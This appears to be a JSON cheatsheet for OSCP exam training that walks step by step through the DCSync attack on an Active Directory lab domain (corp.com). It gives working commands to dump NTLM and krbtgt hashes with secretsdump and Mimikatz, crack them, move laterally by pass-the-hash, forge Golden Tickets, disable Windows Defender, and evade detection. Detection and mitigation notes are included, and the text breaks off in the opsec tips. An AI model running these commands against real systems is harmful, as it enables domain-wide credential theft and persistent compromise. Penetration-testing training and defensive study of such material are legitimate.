{
  "cheatsheets": [
    {
      "id": "ad-dcsync-methodology",
      "name": "DC Sync Attack Methodology",
      "description": "Complete methodology for extracting domain credentials via Directory Replication Service (DRS) protocol. Remote credential dumping without DC access.",
      "educational_header": {
        "what_is_dcsync": "DCSync is a credential extraction technique that abuses the Directory Replication Service (DRS) Remote Protocol used by domain controllers to synchronize Active Directory data. By impersonating a domain controller and requesting credential updates via the IDL_DRSGetNCChanges API, an attacker can remotely extract password hashes without executing code on the domain controller or accessing its filesystem. The domain controller receiving the request does not verify whether it came from a legitimate DC - it only checks that the requesting Security Identifier (SID) has appropriate replication privileges.",
        "how_to_recognize_dcsync_opportunity": [
          "You have compromised a Domain Admin, Enterprise Admin, or Administrators group member",
          "You have access to an account with explicit replication rights (rare but possible)",
          "You need to extract krbtgt hash for Golden Ticket creation",
          "You want to obtain Administrator or service account credentials",
          "You have network connectivity to a domain controller (RPC ports 135, 445, dynamic high ports)",
          "You want to avoid directly accessing the domain controller filesystem (NTDS.dit extraction)",
          "You need remote credential dumping from Linux (Kali) using Impacket"
        ],
        "when_to_use_dcsync": [
          "After achieving Domain Admin access (first action: DCSync krbtgt for persistence)",
          "When you need specific user credentials without full NTDS.dit dump",
          "When LSA memory dumping is blocked by EDR/AV or credential guard",
          "When you don't have physical/RDP access to the domain controller",
          "When you want to minimize forensic footprint (no NTDS.dit file copies)",
          "During post-exploitation for lateral movement credentials",
          "For obtaining service account credentials (SPNs) for further attacks"
        ],
        "prerequisites": [
          "Domain Admin, Enterprise Admin, OR Administrators group membership",
          "OR explicit replication rights: DS-Replication-Get-Changes AND DS-Replication-Get-Changes-All",
          "Network connectivity to Domain Controller (TCP/UDP 135, 445, 389, 88)",
          "Tools: Mimikatz (Windows) OR impacket-secretsdump (Linux/Kali - RECOMMENDED for OSCP)",
          "Valid domain credentials (plaintext password OR NTLM hash for Pass-the-Hash)"
        ],
        "key_differences_from_alternatives": [
          "vs LSA Dump: DCSync is REMOTE (no DC access needed), LSA requires code execution ON the domain controller",
          "vs NTDS.dit Extraction: DCSync uses network protocol (DRS), NTDS requires filesystem access and offline parsing",
          "vs Memory Dumping (Mimikatz sekurlsa::): DCSync targets DC remotely, memory dumps target local LSASS process",
          "vs Kerberoasting: DCSync extracts NTLM hashes (any user), Kerberoasting extracts TGS tickets (SPN accounts only)",
          "vs Pass-the-Hash: DCSync OBTAINS hashes, PTH USES already-obtained hashes for authentication"
        ],
        "detection_indicators": [
          "Event ID 4662 on Domain Controller: 'An operation was performed on an object' with Properties: {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2} (DS-Replication-Get-Changes) and {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2} (DS-Replication-Get-Changes-All)",
          "Event ID 4624: Logon Type 3 (network logon) to Domain Controller from non-DC system",
          "Event ID 5136: Directory service object modified (if monitoring replication requests)",
          "Replication requests originating from workstation IPs (not DC IP addresses)",
          "Unusual replication activity during non-business hours",
          "Replication requests for single user accounts (legitimate DC-to-DC sync replicates all)",
          "Multiple sequential replication requests targeting high-value accounts (krbtgt, Administrator)"
        ],
        "mitigation_and_defense": [
          "Restrict replication rights to Domain Controllers only (remove from service accounts)",
          "Monitor Event ID 4662 for replication requests from non-DC sources",
          "Implement honeypot krbtgt monitoring (detect unauthorized DCSync attempts)",
          "Use Microsoft ATA/Defender for Identity (alerts on DCSync behavior)",
          "Enable Protected Users group for high-value accounts (reduces hash exposure)",
          "Implement tiered administrative model (separate admin accounts for workstations vs DCs)",
          "Regular krbtgt password rotation (twice, to clear password history)",
          "Network segmentation: Domain Controllers in separate VLAN with strict firewall rules"
        ]
      },
      "scenarios": [
        {
          "title": "Scenario 1: Understanding DC Sync Prerequisites and Rights Verification",
          "context": "You have compromised a workstation as a low-privileged domain user (dave). Through additional exploitation or credential dumping, you've obtained credentials for the account 'jeffadmin' which you suspect has elevated privileges. Before attempting DCSync, you need to verify this account has the necessary rights.",
          "objective": "Verify Domain Admin membership or replication privileges before attempting DCSync to avoid failed attack attempts and unnecessary alerting.",
          "approach": [
            "1. UNDERSTAND THE REQUIREMENTS: DCSync requires Domain Admin OR explicit replication rights. Replication rights are granted to three built-in groups by default: Domain Admins (SID *-512), Enterprise Admins (SID *-519), and Administrators (SID *-544). Additionally, Domain Controllers have these rights (computer accounts in Domain Controllers OU).",
            "2. METHOD A - CHECK GROUP MEMBERSHIP (FASTEST): From a Windows command prompt authenticated as jeffadmin, run: whoami /groups | findstr /I \"Domain Admins\". This displays all security groups for the current user. Look for 'CORP\\Domain Admins' in the output. If present, you have DCSync capability.",
            "3. METHOD B - QUERY DOMAIN ADMINS GROUP: Run: net group \"Domain Admins\" /domain. This queries the domain controller for all members of the Domain Admins group. Verify 'jeffadmin' appears in the 'Members' list. This method is authoritative (queries DC directly) but requires domain connectivity.",
            "4. METHOD C - ADVANCED (IF NOT DOMAIN ADMIN): If jeffadmin is NOT a Domain Admin, check for explicit replication rights. This is rare but possible in environments with custom permission delegation. From PowerShell with RSAT installed: (Get-Acl 'AD:\\DC=corp,DC=com').Access | Where-Object {$_.IdentityReference -eq 'CORP\\jeffadmin' -and ($_.ObjectType -eq '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2' -or $_.ObjectType -eq '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2')} | Select IdentityReference, ActiveDirectoryRights. Both GUIDs must be present.",
            "5. VERIFY CONNECTIVITY: Test domain controller reachability: nltest /dsgetdc:corp.com. Verify DNS resolution: nslookup corp.com. Test SMB/RPC connectivity: Test-NetConnection DC1.corp.com -Port 445. These ports are required: 135 (RPC), 445 (SMB), 389 (LDAP), 88 (Kerberos).",
            "6. DOCUMENT FINDINGS: Save verification results to enumeration.md. Record: jeffadmin group memberships, domain controller IP/FQDN, connectivity test results. This documentation prevents re-verification and helps troubleshooting if DCSync fails."
          ],
          "commands": [
            "ad-dcsync-check-user-groups",
            "ad-dcsync-check-domain-admins",
            "ad-dcsync-check-replication-rights"
          ],
          "expected_outcome": "You confirm jeffadmin is a member of Domain Admins group OR has explicit replication rights. You have verified network connectivity to the domain controller. You are ready to proceed with DCSync credential extraction.",
          "why_this_works": "Active Directory's security model trusts ANY principal with replication rights to request password data. The domain controller uses the Directory Replication Service (DRS) Remote Protocol (MS-DRSR) to synchronize data between DCs. When a replication request arrives, the DC validates that the caller's SID has the extended rights 'DS-Replication-Get-Changes' (basic metadata) and 'DS-Replication-Get-Changes-All' (sensitive data including password hashes). It does NOT verify the request originated from a domain controller computer account. This design allows legitimate scenarios like backup software with delegated permissions, but attackers abuse it by using compromised Domain Admin accounts.",
          "common_mistakes": [
            "Assuming any domain user can DCSync (only Domain Admins or explicit replication rights work)",
            "Not verifying connectivity to DC before attempting DCSync (wastes time on network troubleshooting)",
            "Using local administrator credentials instead of domain credentials (DCSync requires domain authentication)",
            "Testing from non-domain-joined machine without proper authentication (use runas /netonly for domain context)",
            "Forgetting to check if account is locked or disabled (net user jeffadmin /domain shows account status)"
          ],
          "oscp_exam_relevance": "HIGH - Prerequisite verification saves critical exam time. In OSCP labs, you typically obtain Domain Admin through privilege escalation or lateral movement. Immediately verify rights and document DC connectivity before attempting DCSync. This prevents wasted time on failed attacks."
        },
        {
          "title": "Scenario 2: Extracting Single User Credentials with DCSync",
          "context": "You have verified jeffadmin is a Domain Admin. During reconnaissance, you identified a user account 'dave' who appears to have access to sensitive file shares. You want to extract dave's password hash to either crack it for plaintext password or use it for Pass-the-Hash lateral movement.",
          "objective": "Extract dave's NTLM password hash using DCSync technique, then crack the hash with Hashcat or use it for Pass-the-Hash authentication.",
          "approach": [
            "1. CHOOSE YOUR METHOD: You have two primary DCSync tools: Mimikatz (Windows) or impacket-secretsdump (Linux/Kali). For OSCP exams, impacket-secretsdump is RECOMMENDED because: (a) Runs on Kali (no AV interference), (b) Clean, parseable output, (c) No need for RDP/shell on Windows target, (d) Same command works for Pass-the-Hash.",
            "2. WINDOWS METHOD (MIMIKATZ): If you're already on a compromised Windows machine with Mimikatz available, launch PowerShell or cmd.exe as jeffadmin. Navigate to Mimikatz directory: cd C:\\Tools. Launch Mimikatz: .\\mimikatz.exe. Run DCSync command: lsadump::dcsync /user:corp\\dave. Mimikatz will display extensive output including SAM username, RID, account flags, and multiple hash formats.",
            "3. LINUX METHOD (IMPACKET - RECOMMENDED): From your Kali machine, use impacket-secretsdump. The syntax is: impacket-secretsdump -just-dc-user dave 'corp.com/jeffadmin:BrouhahaTungPerorateBroom2023!@192.168.50.70'. CRITICAL: Use SINGLE QUOTES around the authentication string to prevent shell interpretation of special characters in the password (!, $, \\, etc.). The -just-dc-user flag targets only dave (faster and less noisy than full domain dump).",
            "4. PARSE THE OUTPUT: Impacket output format: dave:1103:aad3b435b51404eeaad3b435b51404ee:08d7a47a6f9f66b97b1bae4178747494:::. This is Hashcat-ready format. The hash structure: username:RID:LM_hash:NTLM_hash:::. The LM hash portion (aad3b435b51404eeaad3b435b51404ee) indicates empty/disabled LM hashing (modern Windows). The NTLM hash (08d7a47...) is what you need. Copy this entire line or just the NTLM portion.",
            "5. CRACK THE HASH: Save hash to file: echo '08d7a47a6f9f66b97b1bae4178747494' > dave_hash.txt. Use Hashcat mode 1000 (NTLM): hashcat -m 1000 dave_hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force. Start this in background with: hashcat ... & disown. While cracking runs, you can use the hash immediately for Pass-the-Hash.",
            "6. USE HASH IMMEDIATELY (PASS-THE-HASH): Don't wait for cracking to complete. Use the NTLM hash for authentication: impacket-psexec -hashes :08d7a47a6f9f66b97b1bae4178747494 corp.com/dave@192.168.50.75 (target machine where dave has admin rights). Or access SMB shares: smbclient //192.168.50.75/Data -U dave --pw-nt-hash 08d7a47a6f9f66b97b1bae4178747494.",
            "7. DOCUMENT EVERYTHING: Save to exploitation.md: (a) DCSync command used, (b) Output with NTLM hash, (c) Cracked password (if successful), (d) Systems where dave has admin rights, (e) SMB shares accessed with dave's credentials, (f) Time spent (for exam time management)."
          ],
          "commands": [
            "ad-dcsync-secretsdump-user",
            "ad-dcsync-mimikatz-user",
            "windows-hashcat-crack-ntlm",
            "ad-pass-the-hash-impacket-psexec"
          ],
          "expected_outcome": "You successfully extract dave's NTLM hash (08d7a47a6f9f66b97b1bae4178747494). Hashcat cracks it to plaintext password 'Flowers1'. You use the hash for Pass-the-Hash lateral movement to CLIENT75 where dave is a local administrator. You gain command execution on CLIENT75 and extract additional credentials from LSASS memory.",
          "why_this_works": "The Directory Replication Service allows domain controllers to request password data for specific users via IDL_DRSGetNCChanges API. When you run DCSync targeting dave, the domain controller retrieves dave's password verifier (NTLM hash) from the NTDS.dit database and transmits it over the network. The DC packages this as a replication response, identical to legitimate DC-to-DC synchronization. Your tools (Mimikatz or Impacket) parse this response and extract the hash. The hash is sufficient for Pass-the-Hash attacks because NTLM authentication uses the hash directly, not the plaintext password. NTLM challenge-response: Client proves knowledge of hash by encrypting server's challenge with the hash.",
          "common_mistakes": [
            "Forgetting single quotes around auth string in impacket-secretsdump (special characters break command parsing)",
            "Using IP address instead of FQDN for subsequent Pass-the-Hash with Kerberos (IP forces NTLM, FQDN enables Kerberos)",
            "Waiting for Hashcat to finish before using hash (use hash immediately with PTH while cracking runs in background)",
            "Not documenting which systems dave has admin rights on (wastes time re-testing access)",
            "Copying partial hash or including colons/spaces (hash must be exactly 32 hexadecimal characters)",
            "Using wrong Hashcat mode (mode 1000 for NTLM, mode 3000 for LM, mode 5600 for NTLMv2)"
          ],
          "oscp_exam_relevance": "MEDIUM-HIGH - While OSCP exam typically provides initial access as low-privileged user, lateral movement often requires credential extraction. DCSync is faster and cleaner than memory dumping (no AV interference). The Pass-the-Hash technique works even if password is complex/uncrackable. Time estimate: 2-10 seconds for DCSync, 1-60+ minutes for hash cracking (run in background)."
        },
        {
          "title": "Scenario 3: Extracting krbtgt Hash for Golden Ticket Attack",
          "context": "You have achieved Domain Admin access as jeffadmin. You want to establish persistent domain-wide access that survives password changes and account lockouts. Your target is the krbtgt account hash, which enables Golden Ticket creation.",
          "objective": "Extract the krbtgt account password hash, obtain the Domain SID, and prepare data for Golden Ticket creation. This provides long-term persistence independent of other account credentials.",
          "approach": [
            "1. UNDERSTAND KRBTGT'S ROLE: The krbtgt account (RID 502) is a disabled service account used by the Key Distribution Center (KDC) to encrypt and sign all Kerberos Ticket Granting Tickets (TGTs). Its password hash is the cryptographic key for TGT validation. With this hash, you can forge TGTs (Golden Tickets) that grant Domain Admin rights to any user. The krbtgt password is randomly generated at domain creation and ONLY changes during domain functional level upgrades (e.g., Server 2003 → 2008). In mature environments, this hash may be 10+ years old.",
            "2. DCSYNC KRBTGT (IMPACKET METHOD - RECOMMENDED): From Kali, run: impacket-secretsdump -just-dc-user krbtgt 'corp.com/jeffadmin:BrouhahaTungPerorateBroom2023!@192.168.50.70'. This targets only the krbtgt account. Output format: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1693c6cefafffc7af11ef34d1c788f47:::. The NTLM hash (1693c6ce...) is your Golden Ticket key. Save this immediately - it's your persistent backdoor.",
            "3. DCSYNC KRBTGT (MIMIKATZ METHOD): If using Windows, launch Mimikatz and run: lsadump::dcsync /user:corp\\krbtgt. Parse the output for 'Hash NTLM: [32 hex characters]'. You may also see AES256 and AES128 keys - save these for stealthier Golden Tickets (AES encryption is less suspicious than RC4).",
            "4. OBTAIN DOMAIN SID: The Domain SID is required for Golden Ticket creation. From Windows as any domain user: whoami /user. Output shows: corp\\jeffadmin S-1-5-21-1987370270-658905905-1781884369-1105. The Domain SID is S-1-5-21-1987370270-658905905-1781884369 (remove the user RID -1105). From Linux: lookupsid.py 'corp.com/jeffadmin:BrouhahaTungPerorateBroom2023!@192.168.50.70' | grep 'Domain SID'. Or: rpcclient -U 'corp.com/jeffadmin%BrouhahaTungPerorateBroom2023!' 192.168.50.70 -c 'lsaquery'.",
            "5. OBTAIN DOMAIN FQDN: Required for Golden Ticket. From Windows: echo %USERDNSDOMAIN%. Output: corp.com. From Linux, use the FQDN you've been using (corp.com). Alternatively, query DNS: dig -t SRV _ldap._tcp.dc._msdcs.corp.com (shows domain FQDN).",
            "6. DOCUMENT THE GOLDEN TICKET DATA: Save to breakthrough.md: (a) krbtgt NTLM hash: 1693c6cefafffc7af11ef34d1c788f47, (b) Domain SID: S-1-5-21-1987370270-658905905-1781884369, (c) Domain FQDN: corp.com, (d) AES256 key (if available): [64 hex chars], (e) Target username for ticket (can be any existing user, e.g., jen). These four values are ALL you need for Golden Ticket persistence.",
            "7. NEXT STEPS - GOLDEN TICKET CREATION: You now have everything needed for Golden Ticket. From Windows with Mimikatz: kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt. From Linux with Impacket: ticketer.py -nthash 1693c6cefafffc7af11ef34d1c788f47 -domain-sid S-1-5-21-1987370270-658905905-1781884369 -domain corp.com jen. Then use the ticket: export KRB5CCNAME=jen.ccache && psexec.py -k -no-pass corp.com/jen@DC1.corp.com."
          ],
          "commands": [
            "ad-dcsync-secretsdump-krbtgt",
            "ad-dcsync-mimikatz-krbtgt",
            "ad-sid-whoami-extract",
            "ad-golden-ticket-ticketer-create",
            "ad-golden-ticket-mimikatz-create"
          ],
          "expected_outcome": "You successfully extract: krbtgt NTLM hash (1693c6ce...), Domain SID (S-1-5-21-1987370270-658905905-1781884369), and Domain FQDN (corp.com). You create a Golden Ticket for user 'jen' and inject it into memory. You can now access any system in the domain with Domain Admin rights, even if all other passwords change. The krbtgt hash remains valid for years (until manual rotation).",
          "why_this_works": "Kerberos authentication relies on the krbtgt account's password hash as the cryptographic key for TGT encryption and validation. When a user authenticates, the KDC issues a TGT encrypted with the krbtgt hash. The TGT contains a PAC (Privilege Attribute Certificate) with group memberships, including Domain Admins. When you possess the krbtgt hash, you can forge TGTs with arbitrary PAC data - you can claim to be any user with any group memberships. The domain controller cannot distinguish your forged TGT from a legitimate one because the encryption is cryptographically valid. The DC decrypts your Golden Ticket with the krbtgt hash, validates the signature, and trusts the PAC data. You gain Domain Admin rights without the domain admin password ever being used.",
          "common_mistakes": [
            "Including user RID in Domain SID parameter (remove -1105 from S-1-5-21-...-1105)",
            "Using fictional username for Golden Ticket on patched systems (July 2022 update requires existing accounts)",
            "Not saving krbtgt hash externally (if you lose access, you lose persistence)",
            "Using IP addresses instead of FQDNs when using Golden Ticket (Kerberos requires hostnames)",
            "Creating Golden Ticket with unrealistic lifetime (default 10 years is suspicious - consider 90 days)",
            "Forgetting to purge existing tickets before injecting Golden Ticket (klist purge)"
          ],
          "oscp_exam_relevance": "VERY HIGH - This is the ULTIMATE privilege escalation in Active Directory. Once you achieve Domain Admin, immediately DCSync krbtgt for persistence. If the exam resets or your session dies, you can recreate the Golden Ticket for instant Domain Admin re-entry. Time estimate: 2-10 seconds for krbtgt extraction, 1-2 minutes for complete Golden Ticket workflow including SID extraction and ticket creation."
        },
        {
          "title": "Scenario 4: Hash Cracking Workflow and Pass-the-Hash Integration",
          "context": "You have used DCSync to extract multiple user hashes: dave (standard user), Administrator (domain admin), and several service accounts. You want to crack these hashes for plaintext passwords while simultaneously using them for Pass-the-Hash lateral movement.",
          "objective": "Set up efficient hash cracking workflow with Hashcat while leveraging hashes immediately for Pass-the-Hash authentication. Maximize efficiency by running cracking in background.",
          "approach": [
            "1. ORGANIZE EXTRACTED HASHES: After DCSync extraction, save all hashes to a file in Hashcat format. Create dave_hashes.txt with content: 08d7a47a6f9f66b97b1bae4178747494 (just NTLM, no username/RID). For multiple users, create all_hashes.txt with one hash per line. This format works directly with Hashcat mode 1000.",
            "2. START HASHCAT IN BACKGROUND: Launch Hashcat with background processing: hashcat -m 1000 all_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force & disown. The & runs it in background, disown detaches it from your terminal. Check progress later with: hashcat -m 1000 all_hashes.txt --show (displays cracked hashes).",
            "3. PARALLEL PASS-THE-HASH TESTING: While Hashcat runs, immediately test hashes for lateral movement. Use CrackMapExec for rapid admin access discovery: crackmapexec smb 192.168.50.0/24 -u dave -H 08d7a47a6f9f66b97b1bae4178747494 -d corp.com. This tests dave's hash against all hosts in the subnet. Output shows 'Pwn3d!' for systems where dave is local admin.",
            "4. TARGETED LATERAL MOVEMENT: Once you identify systems where dave is admin (e.g., CLIENT75), use impacket for command execution: impacket-psexec -hashes :08d7a47a6f9f66b97b1bae4178747494 corp.com/dave@192.168.50.75. Or for stealth, use wmiexec (doesn't write to disk): impacket-wmiexec -hashes :08d7a47a6f9f66b97b1bae4178747494 corp.com/dave@192.168.50.75.",
            "5. PRIORITIZE HIGH-VALUE HASHES: Focus cracking effort on Administrator and service account hashes. These are more likely to have complex passwords requiring longer cracking time. Meanwhile, standard user hashes (dave) may crack within minutes using rockyou.txt. Check cracking status periodically: watch -n 60 'hashcat -m 1000 all_hashes.txt --show | wc -l' (refreshes every 60 seconds).",
            "6. USE CRACKED PASSWORDS FOR RDP/SMB: When Hashcat cracks a password, you can use it for RDP access (more convenient than command-line shells): xfreerdp /u:dave /p:Flowers1 /d:corp.com /v:192.168.50.75. Or mount SMB shares: mount -t cifs //192.168.50.75/C$ /mnt/client75 -o username=dave,password=Flowers1,domain=corp.com.",
            "7. DOCUMENT CRACKED CREDENTIALS: Maintain a credentials table in post_exploitation.md: | Username | NTLM Hash | Plaintext | Systems | Access Level | | dave | 08d7a47... | Flowers1 | CLIENT75, CLIENT76 | Local Admin | | Administrator | 2892d26... | (cracking...) | DC1, all systems | Domain Admin |. This prevents duplicate work and helps with reporting."
          ],
          "commands": [
            "windows-hashcat-crack-ntlm-file",
            "ad-pass-the-hash-crackmapexec",
            "ad-pass-the-hash-impacket-psexec",
            "ad-pass-the-hash-impacket-wmiexec",
            "windows-rdp-xfreerdp"
          ],
          "expected_outcome": "Hashcat cracks dave's hash to 'Flowers1' within 5 minutes. Administrator hash is still cracking after 30 minutes (complex password). You use dave's hash via Pass-the-Hash to access CLIENT75 and CLIENT76 (local admin). You extract additional credentials from CLIENT75's LSASS memory. You use Administrator's hash (even without plaintext) to access domain controller via wmiexec. Total time efficiency: Hash cracking runs overnight, but you gain immediate access via PTH.",
          "why_this_works": "NTLM authentication uses the password hash directly, not the plaintext password. The NTLM challenge-response protocol: (1) Client requests access, (2) Server sends random challenge, (3) Client encrypts challenge with NTLM hash, (4) Server verifies encryption matches expected value. At no point is the plaintext password transmitted or required. This means an attacker with the NTLM hash can authenticate identically to a user with the plaintext password. Hash cracking is useful for: (1) RDP access (requires plaintext), (2) Web applications (require plaintext), (3) Credential reuse testing (users reusing passwords), (4) Reporting (demonstrating weak passwords). But for Windows network authentication, the hash alone is sufficient.",
          "common_mistakes": [
            "Waiting for hashes to crack before attempting lateral movement (use PTH immediately)",
            "Not running Hashcat in background (occupies terminal, blocks other work)",
            "Using wrong Hashcat mode (mode 1000 for NTLM, not 3000 LM or 5600 NTLMv2)",
            "Not documenting which systems each user has admin rights on (duplicate effort)",
            "Forgetting to use --force flag in VMs (Hashcat requires it for virtualized GPUs)",
            "Not checking cracking status periodically (may crack hours ago without notification)",
            "Trying to RDP with hash instead of password (RDP requires plaintext, use xfreerdp with cracked password)"
          ],
          "oscp_exam_relevance": "HIGH - Time management is critical in OSCP. Running hash cracking in background while performing lateral movement maximizes efficiency. You may crack additional credentials hours later that open new attack paths. Pass-the-Hash works immediately even for complex 20+ character passwords that would take days to crack. Time estimate: PTH lateral movement 10-30 seconds per host, hash cracking 1 minute - 24+ hours depending on password complexity."
        }
      ],
      "sections": [
        {
          "title": "Phase 1: Prerequisites and Rights Verification",
          "notes": "Before attempting DCSync, verify you have Domain Admin membership OR explicit replication rights. Test domain controller connectivity and save DC IP/FQDN for commands.",
          "commands": [
            "ad-dcsync-check-user-groups",
            "ad-dcsync-check-domain-admins",
            "ad-dcsync-check-replication-rights"
          ]
        },
        {
          "title": "Phase 2: Credential Extraction (Windows - Mimikatz)",
          "notes": "Windows-based DCSync using Mimikatz. Useful when you have RDP/shell access to a Windows machine. Requires Mimikatz binary on target system.",
          "commands": [
            "ad-dcsync-mimikatz-user",
            "ad-dcsync-mimikatz-krbtgt",
            "ad-dcsync-mimikatz-administrator"
          ]
        },
        {
          "title": "Phase 3: Credential Extraction (Linux - Impacket) [RECOMMENDED]",
          "notes": "Linux-based DCSync from Kali using impacket-secretsdump. RECOMMENDED for OSCP - no AV interference, clean output, works with Pass-the-Hash authentication.",
          "commands": [
            "ad-dcsync-secretsdump-user",
            "ad-dcsync-secretsdump-krbtgt",
            "ad-dcsync-secretsdump-all"
          ]
        },
        {
          "title": "Phase 4: Hash Cracking and Pass-the-Hash",
          "notes": "Process extracted hashes for either plaintext password recovery (Hashcat) or immediate use via Pass-the-Hash. Run cracking in background while performing lateral movement.",
          "commands": [
            "windows-hashcat-crack-ntlm",
            "ad-pass-the-hash-crackmapexec",
            "ad-pass-the-hash-impacket-psexec"
          ]
        },
        {
          "title": "Phase 5: Persistence via Golden Ticket",
          "notes": "Use extracted krbtgt hash to create Golden Tickets for long-term domain persistence. Requires: krbtgt NTLM hash, Domain SID, Domain FQDN, valid username.",
          "commands": [
            "ad-sid-whoami-extract",
            "ad-golden-ticket-purge-tickets",
            "ad-golden-ticket-mimikatz-create",
            "ad-golden-ticket-ticketer-create"
          ]
        }
      ],
      "common_issues": {
        "ERROR_DS_DRA_ACCESS_DENIED (0x2105) - DCSync fails with access denied": {
          "cause": "Current user lacks replication privileges. DCSync requires Domain Admin, Enterprise Admin, Administrators group membership, OR explicit extended rights (DS-Replication-Get-Changes AND DS-Replication-Get-Changes-All).",
          "solution": "Verify Domain Admin membership: net group \"Domain Admins\" /domain (look for your username). Check current groups: whoami /groups | findstr \"Domain Admins\". If not DA, escalate privileges or find alternative credential dumping method (LSA dump if you have DC access, memory dumping if you have local admin).",
          "prevention": "Always verify rights before attempting DCSync using ad-dcsync-check-domain-admins or ad-dcsync-check-user-groups commands. Document user privileges in enumeration.md.",
          "verification": "Test with low-risk user first (not Administrator or krbtgt) to verify DCSync works before targeting high-value accounts."
        },
        "Impacket special characters in password break command": {
          "cause": "Shell interpreting special characters (!,$,\\,etc.) in password as shell operators. Example: impacket-secretsdump 'corp.com/admin:P@ss!word@DC' - the ! triggers bash history expansion.",
          "solution": "ALWAYS use SINGLE QUOTES around entire authentication string: impacket-secretsdump -just-dc-user dave 'corp.com/admin:P@ss!w0rd!@192.168.50.70'. If password contains single quote, escape it: 'password'\"'\"'with'\"'\"'quotes'. Alternative: Use -hashes flag with NTLM hash instead of password (no special char issues).",
          "prevention": "Make single-quoting a habit for ALL impacket commands. Test authentication string with smbclient first: smbclient -L //DC_IP -U 'DOMAIN/USER%PASSWORD'.",
          "verification": "If command fails with syntax error, check quotes. If authentication fails, verify password with different tool (crackmapexec, rpcclient)."
        },
        "RPC server unavailable / Connection refused": {
          "cause": "Cannot reach domain controller on required RPC/SMB ports. DCSync requires: TCP 135 (RPC endpoint mapper), TCP 445 (SMB), TCP 389 (LDAP), dynamic high ports (49152-65535). Network firewall, DC offline, or incorrect DC IP.",
          "solution": "Verify DC reachability: ping <DC_IP>. Test SMB: smbclient -L //<DC_IP> -U <DOMAIN>/<USER>. Scan ports: sudo nmap -p 135,445,389,88 -Pn -v <DC_IP>. Verify DC FQDN resolves: nslookup <DC_FQDN>. If using IP, try FQDN. If using FQDN, try IP with -target-ip flag.",
          "prevention": "Always test DC connectivity BEFORE attempting DCSync. Use nltest /dsgetdc:<DOMAIN> to find nearest DC. Save DC IP and FQDN to enumeration.md for reference.",
          "verification": "Successful connection test: crackmapexec smb <DC_IP> -u <USER> -p <PASS> -d <DOMAIN> should show SMB signing status and OS version."
        },
        "KRB_AP_ERR_SKEW - Kerberos time skew error": {
          "cause": "Clock difference between Kali system and Domain Controller exceeds 5 minutes. Kerberos requires time synchronization within 5-minute window for replay attack prevention. Common when using VMs with suspended state or incorrect timezone.",
          "solution": "Sync time with DC: sudo ntpdate <DC_IP> (install ntpdate if missing: sudo apt install ntpdate). Alternative: sudo rdate -n <DC_IP>. Manual sync: sudo timedatectl set-time '<DC_TIME>'. Verify: date (show local time) and net time \\\\<DC_IP> (show DC time).",
          "prevention": "Set NTP server to DC IP in /etc/systemd/timesyncd.conf: NTP=<DC_IP>. Or add cron job: @hourly sudo ntpdate <DC_IP>. For OSCP exam, sync time at exam start.",
          "verification": "Time difference check: echo \"Local: $(date)\" && echo \"DC: $(net time \\\\<DC_IP>)\" - should be within 5 minutes."
        },
        "Hash cracking takes too long / password not in rockyou.txt": {
          "cause": "Password not in standard wordlists (rockyou.txt). Complex passwords (20+ characters, random) can take days/years to crack. Service account passwords are often machine-generated 120+ character strings (impossible to crack).",
          "solution": "Use the NTLM hash directly with Pass-the-Hash - no password needed: impacket-psexec -hashes :<NTLM_HASH> <DOMAIN>/<USER>@<TARGET>. Hash works identically to plaintext password for Windows authentication. Only crack hashes when plaintext is required (RDP, web apps, credential reuse testing).",
          "prevention": "Start hash cracking in background (hashcat ... & disown) and move on to lateral movement. Check progress periodically (hashcat --show). Don't wait for cracking to complete - use PTH immediately.",
          "verification": "Test hash with PTH before cracking: crackmapexec smb <TARGET> -u <USER> -H <HASH> -d <DOMAIN>. If shows 'Pwn3d!', hash works for access."
        },
        "Mimikatz detected by antivirus / Windows Defender": {
          "cause": "Mimikatz has well-known signatures detected by all antivirus products. Windows Defender blocks execution with 'This app can't run on your PC' or quarantines mimikatz.exe.",
          "solution": "OPTION A (Best for OSCP): Use impacket-secretsdump from Kali instead - no AV on attacker machine. OPTION B: Disable Windows Defender: Set-MpPreference -DisableRealtimeMonitoring $true (requires admin). OPTION C: Use obfuscated Mimikatz variant (Invoke-Mimikatz, SafetyKatz). OPTION D: Use alternative tools: Rubeus (DCSync capable), pypykatz (Python implementation).",
          "prevention": "For OSCP, prefer Linux-based tools (Impacket) over Windows tools (Mimikatz) to avoid AV issues. If you must use Mimikatz, disable AV immediately after gaining admin access.",
          "verification": "Test Mimikatz execution: .\\mimikatz.exe \"privilege::debug\" \"exit\". If runs without error, AV is bypassed or disabled."
        }
      },
      "time_budget_oscp": {
        "prerequisite_verification": "1-2 minutes (whoami /groups, net group checks)",
        "dcsync_single_user": "5-10 seconds (impacket or Mimikatz)",
        "dcsync_krbtgt_extraction": "5-10 seconds (same as single user)",
        "domain_sid_extraction": "30 seconds (whoami /user or lookupsid.py)",
        "golden_ticket_creation": "1-2 minutes (including ticket injection and verification)",
        "hash_cracking_rockyou": "1 minute - 2 hours (depends on password complexity, run in background)",
        "pass_the_hash_lateral_movement": "10-30 seconds per target host",
        "full_domain_dump": "30 seconds - 5 minutes (depends on domain size, rarely needed in OSCP)",
        "total_dcsync_to_golden_ticket": "5-10 minutes (from DA access to persistent domain compromise)"
      },
      "detection_and_opsec": {
        "blue_team_indicators": [
          "Event ID 4662 on Domain Controller: Directory service access with Properties {1131f6aa...} and {1131f6ad...}",
          "Event ID 4624: Network logon (Type 3) to Domain Controller from workstation IP",
          "Event ID 4634: Logoff immediately after replication request (short session)",
          "Replication requests from non-DC IP addresses (workstations, member servers)",
          "Single-user replication requests (legitimate DC-to-DC sync replicates all objects)",
          "Sequential replication of high-value accounts (krbtgt, Administrator, backup-svc within minutes)",
          "Unusual RPC/LDAP traffic patterns to Domain Controllers during non-business hours"
        ],
        "opsec_tips": [
          "Use -just-dc-user for targeted extraction (less noisy than full dump)",
          "Perform DCSync during business hours when legitimate replication occurs",
          "Use service account credentials for DCSync (blends with automation traffic)",
          "Space out replication requests (wait 5-10 minutes between high-value targets)",
          "Use Kerberos authentication (-k) instead of NTLM when possible (less suspicious)",
